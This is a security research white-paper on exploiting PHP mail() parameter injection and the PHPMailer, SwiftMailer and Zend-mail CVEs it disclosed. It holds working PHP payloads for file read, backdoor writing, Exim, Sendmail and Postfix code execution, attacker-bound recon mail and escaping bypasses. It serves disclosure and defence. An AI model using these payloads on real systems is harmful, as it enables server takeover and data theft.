|=---------------------=[ <https://ExploitBox.io>     ]=-------------------=|
|=---------------------=[ [@Exploit_Box](https://twitter.com/Exploit_Box)              ]=-------------------=|
|=-----------------------------------------------------------------------=|

--[ Table of contents

0 - Introduction
1 - SMTP protocol - RFC 2821
2 - The mail() function
    2.1 - The 5th parameter ($additional_parameters)
    2.2 - The /usr/sbin/sendmail interface invoked by the mail() function
3 - Sendmail Command Injection via mail() and $additional_parameters
    3.1 - escapeshellcmd() escaping
    3.2 - Sendmail Command Parameter Injection
4 - Differences in the implementation of /usr/sbin/sendmail
5 - Known exploitation vectors
    5.1 - Sendmail MTA: Arbitrary File Read with -C argument
    5.2 - Sendmail MTA: Arbitrary File Write / Remote Code Execution
6 - New exploitation vectors/techniques discovered by the author
    6.1 - All MTAs: Snatching emails / Performing Recon
    6.2 - Sendmail MTA: Improvements to the existing File Write vector
    6.3 - SendmailMTA: Remote Code Execution via sendmail.cf config
    6.4 - Exim MTA: Remote Code Execution
    6.5 - Postfix MTA: Code Execution via malicious config
    6.6 - Sendmail MTA: Denial of Service via File Read + File Append
7 - The param injection point & Real World vulnerability examples
    7.1 - Vulnerable email libraries (PHPMailer / Zend-mail / SwiftMailer)
    7.2 - The sender injection via SetFrom() method of the PHP email libs
    7.3 - Other injection points / ways to exploit mail() vulnerabilities
8 - Bypass techniques
    8.1 - The beauty of RFC 3696 & RFC 822
    8.2 - Bypassing escapeshellarg() applied on mail()
9 - Credits
10 - References
11 - Disclaimer

--[ 0 - Introduction

This white-paper strives to clear the common misonception in regards to
the limitations in exploitation of the PHP mail() function and show that
the exploitation can be taken further than what is currently believed.

It presents several new exploitation vectors and bypass techniques
on the PHP mail() function that were discovered and recently released by the
author of this white-paper in the course of finding multiple critical
vulnerabilities in major PHP e-mail sending libraries (PHPMailer, Zend
Framework / Zend-mail, SwiftMailer) that are used by millions of web
applications/projects (e.g Wordpress, Drupal, Joomla etc.)  and PHP
programming frameworks (Zend, Yii2, Symphony, Laravel etc.)

The techniques include Exim vector that was believed to not be exploitable
via mail() function. This vector takes the mail() injection attacks to
a new level.

A successful exploitation of the mail() function, could allow attackers to
achieve Remote Code Execution and other malicious goals.

--[ 1 - SMTP protocol - RFC 2821

According to the RFC 2821
<https://www.ietf.org/rfc/rfc2821.txt>

A client email program would typically send a set of SMTP commands similar
to the following when connecting to an SMTP server:

HELO server-port25.com
MAIL FROM: <support@server-port25.com>
RCPT TO: <jdoe@dest-server.com>

DATA
From: "John Smith" <jsmith@server-port25.com>
Reply-To: "Another Johns email" <John2@another-server25.com>
To:   "Jane Doe" <jdoe@dest-server.com>
Subject: test message
Date: Wed, 4 Jan 2017 06:19:57 -0400

Hello World,

This is a test message sent by SMTP

Regards

.

The important part from the perspective of understanding PHP mail()
function / sendmail's email address usage described further on is that SMTP
client specifies email addresses related to the sender addresses in 2
places:

MAIL FROM: <support@server-port25.com>

and in the header set:

From: "John Smith" <jsmith@server-port25.com>
Reply-To: "Another Johns email" <John2@another-server25.com>

that is sent after the DATA command.

The first will be used by the destination SMTP server to return an email
in case of a delivery problem.

The latter will be used entirely by the email client software (such as
Outlook, Thunderbird etc.) of the user who receives the email, to display
the sender information (based on the From header) in a 'From' address
field as well as to decide (based on Reply-To header if present, or From
header if missing) which address to reply to when the user clicks the
Reply button.

--[ 2 - The mail() function

mail() is a standard PHP function that is used as an interface for sending
e-mails from PHP scripts.
<http://php.net/manual/en/function.mail.php>

The function has the following definition:

# php --rf mail

Function [ <internal:standard> function mail ] {

  - Parameters [5] {
    Parameter #0 [ <required> $to ]
    Parameter #1 [ <required> $subject ]
    Parameter #2 [ <required> $message ]
    Parameter #3 [ <optional> $additional_headers ]
    Parameter #4 [ <optional> $additional_parameters ]
  }
}

From an attacker's perspective, the last (5th) argument is the
most interesting as it can allow injection of additional parameters to
/usr/bin/sendmail program installed on the system which is transparently
used by mail() to deliver the actual message.

--[ 2.1 - The 5th parameter ($additional_parameters)

The 5th parameter is optional. Many web applications use it however
to set envelope sender address / return-path with the parameter:

-f email@server-address.com

or alternatively:

-r email@server-address.com

The parameter with the address will be passed to /usr/sbin/sendmail, which
will use the email address to inform the receiving email server about the
origin/sender (through the 'MAIL FROM' SMTP command), for it to know where
to return an error message in case of a delivery failure.

--[ 2.2 - The /usr/sbin/sendmail interface invoked by the mail() function

/usr/sbin/sendmail program, as the name suggests, is an interface that
can be used for sending emails.
It is provided by the mail transfer agent (MTA) software installed on the
system (such as Sendmail, Postfix etc.).

When an email is sent with mail() by this simple PHP script:

<?php
	$to      = "john@localhost";
	$subject = "Simple Email";
	$headers = "From: mike@localhost";
	$body    = 'Body of the message';

	$sender  = "admin@localhost";

	mail($to, $subject, $body, $headers, "-f $sender");
?>

PHP will make the following execve() call to execute sendmail program:

execve("/bin/sh",
       ["sh", "-c", "/usr/sbin/sendmail -t -i  -f admin@localhost"],
       [/* 24 environment vars */])

and pass the following data to its STDIN:

To: john@localhost
Subject: Simple Email
X-PHP-Originating-Script: 0:simple-send.php
From: mike@localhost

Body of the message

The -t and -i parameters are added by PHP automatically.
Parameter -t makes sendmail extract headers from STDIN , and -i prevents
sendmail from treating '.' as the end of input.
The -f comes from the 5th parameter of the mail() function call.

What is interesting here is that the sendmail command gets executed with the
help of the system shell (sh) which creates some opportunities for command
injection attacks if the application passes untrusted input to the last
/ the 5th parameter of mail() function.

--[ 3 - Sendmail Command Injection via mail() and $additional_parameters

If an attacker was able to inject data to the 5th parameter of mail()
function, for example by means of the $sender variable set to an unfiltered
GET variable:

	$sender = $_GET['senders_email'];
	mail($to, $subject, $body, $headers, "-f $sender");

The attacker could inject arbitrary extra parameters to the
/usr/sbin/sendmail command by making the request to the PHP script:

<http://webserver/vulnerable.php?senders_email=attackers@email%20extra_data>

which would execute mail() as:

mail(..., "-f attackers@email extra_data");

which would lead to executing sendmail with the parameters:

/usr/sbin/sendmail t -i -f attackers@email extra_data

--[ 3.1 - escapeshellcmd() escaping

The important thing to note is that the mail() function performs command
escaping internally by essentially calling the :

escapeshellcmd($additional_parameters)

function, so that shell metacharacters will not work. For example,
setting

$senders_email GET variable to:

attacker@remote > /tmp/shell_injection

will not lead to the file creation of the shell_injection file as >
character will get escaped by the escapeshellcmd() and the sendmail
call will turn into:

/usr/sbin/sendmail t -i -f attacker@remote \> /tmp/shell_injection

thus preventing the special function of the '>' shell metacharacter.

--[ 3.2 - Sendmail Command Parameter Injection

The attacker can however inject additional command parametrs to the
sendmail command itself as the escapeshellcmd() function called by mail()
does not quote the $additional_parameters parameter by default.
It gives a programmer freedom to pass multiple arguments to sendmail,
but may introduce a vulnerability to unaware programmers.

A successful injection of additional parameters to sendmail, might
trigger additional functionality of the sendmail program itself.

For example, if the attacker managed to set $return variable to:

attackere@remote -LogFile /tmp/output_file

The sendmail program would be called as a shell command:

/usr/sbin/sendmail -t -i -f attackere@remote -LogFile /tmp/output_file

If the -LogFile was a valid argument for the sendmail interface installed
on the target machine, this could cause the program to write out a log file
into /tmp/output_file.

As it turns out Sendmail MTA has such a logging function in its
implementation of /usr/sbin/sendmail interface, which can be enabled by
-X parameter and could be used to save malicious code provided by the
attacker.

--[ 4 - Differences in the implementation of /usr/sbin/sendmail

As mentioned in the previous chapters, sendmail interface is provided by
the MTA email software (Sendmail, Postfix, Exim etc.) installed on the
system.

Although the basic functionality (such as -t -i -f parameters) remains the
same for compatibility reasons, other functions and parameters vary
greatly depending on the MTA installed.
For example, the aforementioned -X parameter that can be used for logging
is only implemented in the Sendmail MTA's version of /usr/sbin/sendmail
interface.
The others, simply implement it as a dummy switch, for compatibility
reasons or do not support it at all.

For this reason the man page for sendmail program varies depending on the
MTA installed on the system.

Here are a few examples of different man pages of sendmail command/interface:

Sendmail MTA:
<http://www.sendmail.org/~ca/email/man/sendmail.html>

Postfix MTA:
<http://www.postfix.org/mailq.1.html>

Exim MTA:
<https://linux.die.net/man/8/exim>

--[ 5 - Known exploitation vectors

The potential malicious usage of the 5th parameter of mail() involving
parameter injection to /usr/sbin/sendmail apears to be first uncovered by
Sogeti/ESEC company in the blog post released in 2011:

<http://esec-pentest.sogeti.com/posts/2011/11/03/using-mail-for-remote-code-execution.html>

The blog post revealed 2 exploitation vectors for Sendmail MTA that
may allow an attacker to * read/write to an arbitrary file and potentially
gain Remote Code Execution via -C and -X parameters to sendmail interface
provided by Sendmail MTA.

These 2 vectors only work on Sendmail MTA, and are presented below.

--[ 5.1 - Sendmail MTA: Arbitrary File Read with -C argument

From sendmail man page:

-Cfile
 Use alternate configuration file.

-X logfile
 Log all traffic in and out of mailers in the indicated log file.

These 2 parameters can be combined to cause sendmail to load an arbitrary
file as the config, and output the contents as a set of error messages
(due to unknown config lines).

For example, if attacker injected:

-C/etc/passwd -X/tmp/output.txt

as the 5th parameter of mail(), the following command would get executed:

/usr/sbin/sendmail -i -t -C/etc/passwd -X/tmp/output.txt

which would save the following data into /tmp/output.txt:

/etc/passwd: line 1: unknown configuration line
"root:x:0:0:root:/root:/bin/bash"
/etc/passwd: line 2: unknown configuration line
"daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin"
/etc/passwd: line 3: unknown configuration line
"bin:x:2:2:bin:/bin:/usr/sbin/nologin"
/etc/passwd: line 4: unknown configuration line
"sys:x:3:3:sys:/dev:/usr/sbin/nologin"
/etc/passwd: line 5: unknown configuration line
"sync:x:4:65534:sync:/bin:/bin/sync"
/etc/passwd: line 6: unknown configuration line
"games:x:5:60:games:/usr/games:/usr/sbin/nologin"
...

For the attack to be useful to a remote attacker. The output file would
need to be placed in a writable directory under the document root where it
could be retrieved by the attacker through the web server.

--[ 5.2 - Sendmail MTA: Arbitrary File Write / Remote Code Execution

The -X parameter can also be used in combination with the:

-OQueueDirectory=/tmp/

parameter of Sendmail MTA's version of /usr/sbin/sendmail interface.

The parameter is described by the man page as:

       QueueDirectory=queuedir
              Select the directory in which to queue messages.

Attacker needs to select a world-writable directory to allow for saving
temporary files.

This will allow to successfully send a message passed to sendmail, as well
as save to the log file into an arbitrary file pointed by -X parameter.

Simple PoC:

<?php
	$sender = "attacker@anyhost -OQueueDirectory=/tmp/ -X/tmp/poc.php";
	$body   = '<?php phpinfo(); ?>';
	// ^ unfiltered vars, coming from attacker via GET, POST etc.

	$to = "john@localhost";
	$subject = "Simple Email";
	$headers = "From: mike@localhost";

	mail($to,$subject,$body,$headers, "-f $sender ");
?>

The PoC will save the PHP code within $body into the log file with this
resulting contents of /tmp/poc.php:

06272 <<< To: john@localhost
06272 <<< Subject: Simple Email
06272 <<< X-PHP-Originating-Script: 0:simplepoc.php
06272 <<< From: mike@localhost
06272 <<<
06272 <<< <?php phpinfo(); ?>
06272 <<< [EOF]

As the attacker might be able to control both the filename and contents,
this could potentially result in Arbitrary PHP code execution if the
attacker managed to save it under a writable directory within the document
root such as:

-X/var/www/html/webapp1/upload/backdoor.php

which they could then execute by a GET request:

<http://victim-server/webapp1/upload/backdoor.php>

For this to work, the upload directory must have enabled parsing/execution
of PHP files which sometimes gets turned off for security reasons by the
administrator or by the webapplication installer (via special rules in
.htaccess placed within the upload directory).

Also note that the output log file contains a lot of debug information
added by Sendmail MTA.

--[ 6 - New exploitation vectors/techniques discovered by the author

Sendmail MTA is rarely used due to its complexity and a history of
vulnerabilities.
It is no longer used by modern Linux distributions as the default MTA and
have been replaced with Postfix MTA on RedHat-based systems such as CentOS,
and with Exim MTA on Debian-based systems such as Ubuntu, Debian etc.

This makes it quite difficult to find Sendmail MTA in a real-world setups.
On systems where it is available, the exploitation could sometimes be
tricky due to the aforementioned limitations (correct webroot paths,
requirement for a php-executable/writable directory, mised-up payload).

As both of the known vectors presented in previous chapter require Sendmail
MTA to work, the author has performed a new research which lead to the
discovery of new exploitation vectors/techniques that may be used
on systems with modern MTAs such as Exim and Postfix.
The research has also produced a new vector for Sendmail MTA as well as
some improvements to the already-known vectors.

--[ 6.1 - All MTAs: Snatching emails / Performing Recon

One of the arguments that does not change across different MTAs is the
list of additional recipients which comes after the option list as per
this man page:

       sendmail [option ...] [recipient ...]

If attacker control the 5th parameter of mail() they can simply append
an extra recipient as shown below:

<?php
// Recon via mail() vector on all MTAs / sendmail versions
//
// Created by:
// Dawid Golunski - @dawid_golunski - <https://legalhackers.com>

        $sender = "nobody@localhost attacker@anyhost-domain.com";
        // ^ unfiltered var, coming from attacker via GET, POST etc.

        $to = "support@localhost";
        $headers = "From: mike@localhost";
        $subject = "Support ticket: Remote Recon PoC";
	$body = "Show me what you got!";

        mail($to,$subject,$body,$headers, "-f $sender ");
?>

which would execute the command:

/usr/sbin/sendmail -t -i -f support@localhost attacker@anyhost-domain.com

and send an email similar to the following right into the attacker's
mailbox attacker@anyhost-domain.com:

Return-Path: <nobody@localhost>
Received: from localhost (localhost [127.0.0.1])
	by localhost (8.14.4/8.14.4/Debian-8+deb8u1) with ESMTP
id v04FSqQ5008197;
	Wed, 4 Jan 2017 10:28:52 -0500
Received: (from www-data@localhost)
	by localhost (8.14.4/8.14.4/Submit) id v04FSqEU008196
	for attacker@anyhost-domain.com; Wed, 4 Jan 2017 10:28:52 -0500
Date: Wed, 4 Jan 2017 10:28:52 -0500
Message-Id: <201701041528.v04FSqEU008196@localhost>
X-Authentication-Warning: localhost: www-data set sender to
nobody@localhost using -f
To: support@localhost
Subject: Support ticket: Remote Recon PoC
X-PHP-Originating-Script: 1000:recon-test.php
From: mike@localhost

This might reveal:

* version of operating system in use (Debian)

* server IPs

* the version of MTA in use (8.14.4 in this case, which is Sendmail MTA)

* the name of the script that sent the message (recon-test.php) which
could reveal the name of the email sending library/framework in use e.g:

X-PHP-Originating-Script: 0:class.phpmailer.php

If an application uses a dedicated email library such as PHPMailer,
Zend-mail etc. it might also append its version header.
For example:

X-Mailer: PHPMailer 5.2.17 ([https://github.com/PHPMailer/PHPMailer)](https://github.com/PHPMailer/PHPMailer%29)

Knowing the library in use attacker can adjust their attack to the
specific OS / MTA and PHP email library in use.

For example, the above version of PHPMailer is vulnerable to:

PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)

discovered by the author.

--[ 6.2 - Sendmail MTA: Improvements to the existing File Write vector

It is mistakenly believed that -X parameter requires a full path and
therefore an attacker needs to guess the webroot of a vulnerable website.

This is however not true as sendmail will also accept a relative path.
This allows the attacker to simply use the current working directory
of the remote vulnerable script as a reference.
If the remote script is running at the top level of the webroot,
the attacker may try to inject the following argument:

-X ./upload/backdoor.php

instead of

-X /var/www/html/webapp1/guessed-webroot/

Additionally, the somewhat long:

-OQueueDirectory=/tmp/

parameter can also be reduced to:

-oQ/tmp/

which might be useful if a web application limits the size of the $sender
string, as well as to bypass potential filtration of '=' character etc.

--[ 6.3 - SendmailMTA: Remote Code Execution via sendmail.cf config

In a secure deployment of a webapp, PHP script execution might be disabled
within the upload directory and the application might only allow upload
of static files such as text files, images etc.

A new vector was discovered that could allow RCE despite these limitations.

As sendmail interface allows to load a custom Sendmail MTA config file via

-C

argument to /usr/sbin/sendmail , an attacker could upload a malicious
config file as a static/text file via webapp's upload feature and use
it to force Sendmail to execute malicious code upon processing an
email message.

This could be achieved by making a copy of /etc/mail/sendmail.cf config
file and replacing the default Mlocal mail handler present at the end
of the file with a Sendmail config shown below (between the # lines):

<?php

/*
##########################################################################
# Sendmail MTA config vector executing /usr/bin/php that loads RCE code
# on stdin passed by mail() (e.g. within message body / subject etc.)
#
# Make a copy of a sendmail.cf config from /etc/mail/sendmail.cf
# and then append this config stanza/vector to the end of it.
# Such stanza can then be uploaded to the target webapp into upload/ dir
# for example with an example name of: sendmail_cf_exec
#
# Created by:
# Dawid Golunski - @dawid_golunski - <https://legalhackers.com>

Mlocal,		P=/usr/bin/php, F=lsDFMAw5:/|@qPn9S, S=EnvFromL/HdrFromL,
                R=EnvToL/HdrToL,
		T=DNS/RFC822/X-Unix,
		A=php -- $u $h ${client_addr}
##########################################################################
*/

        $sender = "attacker@anyhost -oQ/tmp/ -C./upload/sendmail_cf_exec
www-data@localhost";

        $body   = 'PHP RCE code: <?php system("touch /tmp/PWNED"); ?>';
        // ^ unfiltered vars, coming from attacker via GET, POST etc.

        $to = "john@localhost";
        $subject = "Exim RCE PoC";
        $headers = "From: mike@localhost";

        mail($to,$subject,$body,$headers, "-f $sender ");

?>

The $sender payload will use relative path to load the crafted Sendmail MTA
config file from (previously uploaded with the static file uploader)
upload/sendmail_cf_exec and use it to process the incoming email from
mail() function.
Sendmail MTA will then spawn /usr/bin/php process and process the
attacker's payload within the $body of the message.

Apart from the remote exploitation with static file upload scenario,
this vector could obviously also be very easily used in a shared hosting
environment.
In such a case, an attacker could easily use /tmp directory to prepare
the malicious config and then use mail() vulnerability in the target app
to load the config and gain code execution in the context of the victim
user.

--[ 6.4 - Exim MTA: Remote Code Execution

Exim MTA is the default MTA software installed with Debian-based systems
such as Ubuntu and Debian.

The /usr/sbin/sendmail interface provided by Exim4 has a fairly rich set
of functions.
The research uncovered -be option which can be very useful to attackers.

The man page states:

       -be       Run Exim in expansion testing mode. Exim discards its root
privilege, to prevent ordinary users from using this mode to read otherwise
inaccessible files.
                 If no arguments are given, Exim runs interactively,
prompting for lines of data. Otherwise, it processes each argument in turn.

The exim syntax/language provided by Exim was investigated for interesting
variables that could be expanded.
The exim syntax allows expanding standard variables such as: '$h_subject'
or '$recipients'.

Further research however uncovered ${run} which can be expanded to return
a result of a shell command.

For example, the following string:

${run{/bin/true}{yes}{no}}

would be expanded to 'yes' upon successful execution of /bin/true.

This was quickly turned into Arbitrary Remote Code Execution payload
which would execute arbitrary shell command passed within $body of the
message:

<?php
// RCE via mail() vector on Exim4 MTA
// Attacker's cmd is passed on STDIN by mail() within $body
// Discovered by:
// Dawid Golunski - @dawid_golunski - <https://legalhackers.com>

        $sender = "attacker@anyhost -be";
        $body   = 'Exec: ${run{/bin/bash -c "/usr/bin/id
>/tmp/id"}{yes}{no}}';
        // ^ unfiltered vars, coming from attacker via GET, POST etc.

        $to = "john@localhost";
        $subject = "Exim RCE PoC";
        $headers = "From: mike@localhost";

        mail($to,$subject,$body,$headers, "-f $sender ");
?>

This exploit vector seems the most powerful as it can allow attackers to
achieve instant RCE on systems with Exim MTA.
The code will get executed as soon as injected parameter/body of mail()
function gets passed to /usr/sbin/sendmail.
There is no need to write to any files and therefore writable directories
that are parsed by PHP engine are not required.

--[ 6.5 - Postfix MTA: Code Execution via malicious config

Postfix has proved to be more tricky during the research.

Nevertheless it was possible to determine a way that an attacker could use
to achieve code execution when the attacker and the target reside within
the same shared hosting environment.

Certain setups could also make it possible to carry out the attack
remotely.

Similarly to Sendmail MTA, the /usr/sbin/sendmail interface provided by Postfix
MTA has a -C switch that can be used to load a custom config.

sendmail will fail however as soon as the attacker's message message is
passed to postdrop command for proessing.
Postdrop will notice the -C config and stop further execution.

This could be bypassed however by creating a custom main.cf Postfix config
in /tmp/main.cf file with the following setting:

mailbox_command = /tmp/postfixfakebin/

The attacker could then place a malicious bash script/binary within the
postfix_fake_bin directory and inject the following parameter to the
/usr/sbin/sendmail interface provided by Postfix MTA, through mail()
parameter injection as shown in the PoC below:

<?php
/*
 Code Exec via mail() vector on Postfix MTA

 Attacker's shell cmds must be placed under postdrop file within a shared
 directory e.g. /tmp/postfixfakebin/postdrop

 A config line of:

 mailbox_command = /tmp/postfixfakebin/

 must also be added to a shared directory e.g. /tmp/main.cf

 Created by:
 Dawid Golunski - @dawid_golunski - <https://legalhackers.com>
*/
        $sender = "attacker@anyhost -C /tmp/";
        // ^ unfiltered vars, coming from attacker via GET, POST etc.

        $body   = 'Simple body, the payload is in postdrop anyway';
        $to = "john@localhost";
        $subject = "Postfic exec PoC";
        $headers = "From: mike@localhost";

        mail($to,$subject,$body,$headers, "-f $sender ");
?>

This scenario could potentially be exploited remotely if a target webapp
(vulnerable to mail() param injection) provides a file manager utitlity
that allows the attacker to create directories/files but does not
parse PHP files.

Another remote scenario could include a file uploader which lets users
upload ZIP files. A malicious zip could contain main.cf and postdrop
script/binary which gets extracted into a known location.

--[ 6.6 - Sendmail MTA: Denial of Service via File Read + File Append

The -C and -X parameters could be used to perform a Denial of Service
attack on the target by reading big known files such as web server logs
with -C option and appending them to a file in a writable directory
by the web server such as /tmp , /var/www/html/upload ,
/var/lib/php5/sessions etc. to exhaust disk space necessary for the correct
operation of the web application / the OS.

Although this specific example is limited to Sendmail MTA, this vector
likely affects more MTA servers and there likely are other parameters
supported by the remaining MTAs that could carry out a similar DoS attack.

--[ 7 - The param injection point & Real World vulnerability examples

The mail() parameter injection was deemed hardly exploitable / impractical
for many years as the 5th parameter of mail() has been thought to be
rarely exposed to malicious input outside of web application control panels
which are usually restricted to administrative users and therefore are
usually of little use to remote attackers.
Finding a mail() param injection vulnerability, would also not necessarily
guarantee a successful exploitation as it would depend on installed MTA on
the web server (its sendmail interface) and up until now the only option was
rarely used Sendmail MTA with the 2 vectors -X -C (File Write / Read) which
decreased the attack surface further.

For this reason, the new attack vectors presented in the previous chapter
could be very useful in exploitation of the real world new vulnerabilities
described further on and open more attack possibilities.

--[ 7.1 - Vulnerable email libraries (PHPMailer / Zend-mail / SwiftMailer)

Recently a set of mail() param injection vulnerabilities was exposed by the
author:

PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)

PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045)

SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)

Zend Framework/zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)

The details can be seen in the respective advisories, however we can have a
quick look at the problem they all shared, on the example of PHPMailer.

--[ 7.2 - The sender injection via SetFrom() method of the PHP email libs

Similarly to the other email libraries, PHPMailer class uses PHP mail()
function as its default transport.

The transport was implemented using the mailSend() function:

    protected function mailSend($header, $body)
    {
        $toArr = array();
        foreach ($this->to as $toaddr) {
            $toArr[] = $this->addrFormat($toaddr);
        }
        $to = implode(', ', $toArr);

        $params = null;
        //This sets the SMTP envelope sender which gets turned into a
        //return-path header by the receiver
        if (!empty($this->Sender)) {
            $params = sprintf('-f%s', $this->Sender);
        }
...
        $result = false;
        if ($this->SingleTo and count($toArr) > 1) {
            foreach ($toArr as $toAddr) {
                $result = $this->mailPassthru($toAddr, $this->Subject,
$body, $header, $params);

as can be seen, it creates a $params variable that appends $this->Sender
property  to '-f ' string to create a sendmail parameter (Envelope Sender
/ MAIL FROM) that gets passed to the mail() function as the 5th parameter.

The internal $this->Sender property can be validated and set by calling
the setFrom() method of PHPMailer class. This looks as follows:

public function setFrom($address, $name = '', $auto = true)
{
$address = trim($address);
$name = trim(preg_replace('/[\r\n]+/', '', $name)); //Strip breaks and trim
// Don't validate now addresses with IDN. Will be done in send().
if (($pos = strrpos($address, '@')) === false or
    (!$this->has8bitChars(substr($address, ++$pos)) or
!$this->idnSupported()) and
    !$this->validateAddress($address)) {
...

In theory, setFrom() should rarely be exposed to untrusted user input, and
even if it was, there is a validation function in place that validates
the email to be RFC 822 compliant so this should not be a problem.

The PHPMailer tutorial at:
<https://github.com/PHPMailer/PHPMailer/wiki/Tutorial>

shows a basic usage PHPMailer as:

<?php
	require 'PHPMailerAutoload.php';
	$mail = new PHPMailer;
	$mail->setFrom('from@example.com', 'Your Name');
	$mail->addAddress('myfriend@example.net', 'My Friend');
	$mail->Subject  = 'First PHPMailer Message';
	$mail->Body     = 'Hi! first e-mail from PHPMailer.';

	if(!$mail->send()) {
	  echo 'Message was not sent.';
	  echo 'Mailer error: ' . $mail->ErrorInfo;
	} else {
	  echo 'Message has been sent.';
}

Contrary to what the name might suggest, this setFrom() example should not
however be used for storing an address provided by visitors.

Unfortunatelly, due to the name of the function and the popularity of the
code snippet, many scripts use setFrom() to set the visitor's 'From' e-mail
address passed through a field in various Contact and Feedback forms.

Unaware that they should be using AddReplyTo() (which sets the
DATA/Reply-To header, as opposed to the MAIL FROM/Envelope Sender address)
instead.

Implementation with setFrom() will however achieve the result and the
Contact/Feedback form may work as expected, even though it does not conform
to the email best practice.

This would not make a severe security flaw , if it was not for the fact
that the untrusted email address set with setFrom() would end up as the
5th parameter to mail() function and the RFC validation could be bypassed.
This made it possible to inject arbitrary parameters to /usr/sbin/sendmail
and lead to a critical Remote Code Execution flaw that could be exploited
via a range of vectors presented in the previous chapter.

As mentioned, the other PHP libraries had a very similar flaw which was
later dubbed with a name - "PwnScriptum".

More details together with a demo of this vulnerability showing how it
could get exploited via a Contact form can be seen at:

<https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html>

A limited exploit has also been shared at:
<https://legalhackers.com/exploits/CVE-2016-10033/10045/10034/10074/PwnScriptum_RCE_exploit.py>

--[ 7.3 - Other injection points / ways to exploit mail() vulnerabilities

The remaining real-world examples will be described in the next version of
this white-paper once the issues have been fixed by certain vendors that
are currently working on security patches.

--[ 8 - Bypass techniques

This chapter presents some bypass techniques that might come in handy to
bypass similar protections.

The next 2 were used to bypass protections offered by the PHP email libraries
discussed in the previous chapter.

--[ 8.1 - The beauty of RFC 3696 & RFC 822

The RFC 3696 / RFC 822 standards

<https://tools.ietf.org/html/rfc3696>
<https://www.ietf.org/rfc/rfc0822.txt>

emails to take the following forms:

      Abc\@def@example.com

      Fred\ Bloggs@example.com

      Joe.\\Blow@example.com

      "Abc@def"@example.com

      "Fred Bloggs"@example.com

The generosity of these standards allowed the author to construct a valid email
address that complies with the RFCs but is at the same time a malicious payload
for the 5th argument of mail():

"Attacker \" -Param2 -Param3"@test.com

when passed to a vulnerable PHP email library and then to mail() function, it
would cause sendmail to execute with the parameters:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fAttacker\]
Arg no. 4 == [-Param2]
Arg no. 5 == [-Param3"@test.com]

Attacker could thus break out of the -f parameter context and inject additional
parameters (arg no. 4 and arg no. 5 in the example above).

--[ 8.2 - Bypassing escapeshellarg() applied on mail()

It seems intuitive that additional parameters passed to sendmail via the 5th
parameter of mail() function should be single quoted with escapeshellarg()
function which has been designed for this kind of purpose.

Unfortunatelly, it clashes with the internal command escaping performed
internally by the mail() function.

A good example of this is the CVE-2016-10033 vulnerability which turned
into a new vulnerability of CVE-2016-10045 , as the fix of this kind could
be bypassed due to the clashing and setting the Sender to:

$mail->SetFrom("\"Attacker\\' -Param2 -Param3\"@test.com", 'Client Name');

would result in the followig list of arguments passed to sendmail program:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-f\"Attacker\\\]
Arg no. 4 == [-Param2]
Arg no. 5 == [-Param3"@test.com']

which again resulted in arbitrary parameters (arg 4 & 5) passed to
/usr/sbin/sendmail.

--[ 9 - Credits

This security white-paper has been written by:

Dawid Golunski ([@dawid_golunski](https://twitter.com/dawid_golunski))
<https://legalhackers.com>

dawid[at]legalhackers.com

Please add a link back to this paper if the information proved to
be useful to you.

--[ 10 - References

[0] <https://legalhackers.com/>
[1] <https://www.ietf.org/rfc/rfc2821.txt>
[2] <http://php.net/manual/en/function.mail.php>
[3] <http://www.sendmail.org/~ca/email/man/sendmail.html>
[4] <http://www.postfix.org/mailq.1.html>
[5] <https://linux.die.net/man/8/exim>
[6] <https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html>
[7] <https://legalhackers.com/exploits/CVE-2016-10033/10045/10034/10074/PwnScriptum_RCE_exploit.py>
[8] <https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html>

--[ 11 - [ExploitBox - A Playground For Hackers](https://ExploitBox.io)

Interested in vulns/exploitation?

                        .;lc'
                    .,cdkkOOOko;.
                 .,lxxkkkkOOOO000Ol'
             .':oxxxxxkkkkOOOO0000KK0x:'
          .;ldxxxxxxxxkxl,.'lk0000KKKXXXKd;.
       ':oxxxxxxxxxxo;.       .:oOKKKXXXNNNNOl.
      '';ldxxxxxdc,.              ,oOXXXNNNXd;,.
     .ddc;,,:c;.         ,c:         .cxxc:;:ox:
     .dxxxxo,     .,   ,kMMM0:.  .,     .lxxxxx:
     .dxxxxxc     lW. oMMMMMMMK  d0     .xxxxxx:
     .dxxxxxc     .0k.,KWMMMWNo :X:     .xxxxxx:
     .dxxxxxc      .xN0xxxxxxxkXK,      .xxxxxx:
     .dxxxxxc    lddOMMMMWd0MMMMKddd.   .xxxxxx:
     .dxxxxxc      .cNMMMN.oMMMMx'      .xxxxxx:
     .dxxxxxc     lKo;dNMN.oMM0;:Ok.    'xxxxxx:
     .dxxxxxc    ;Mc   .lx.:o,    Kl    'xxxxxx:
     .dxxxxxdl;. .,               .. .;cdxxxxxx:
     .dxxxxxxxxxdc,.              'cdkkxxxxxxxx:
      .':oxxxxxxxxxdl;.       .;lxkkkkkxxxxdc,.
          .;ldxxxxxxxxxdc, .cxkkkkkkkkkxd:.
             .':oxxxxxxxxx.ckkkkkkkkxl,.
                 .,cdxxxxx.ckkkkkxc.
                    .':odx.ckxl,.
                        .,.'.

 <https://ExploitBox.io>

 <https://twitter.com/Exploit_Box>

Subscribe to stay updated and be there for the launch.

--[ 12 - Disclaimer

The information contained within this advisory is supplied "as-is" with
no warranties or guarantees of fitness of use or otherwise. I accept no
responsibility for any damage caused by the use or misuse of this
information.

--[ EOF

```

**COMING SOON**

[![](../assets/img/logo.png)](https://ExploitBox.io)



=== Content from blog.ripstech.com_1a3d9bfb_20250126_062408.html ===
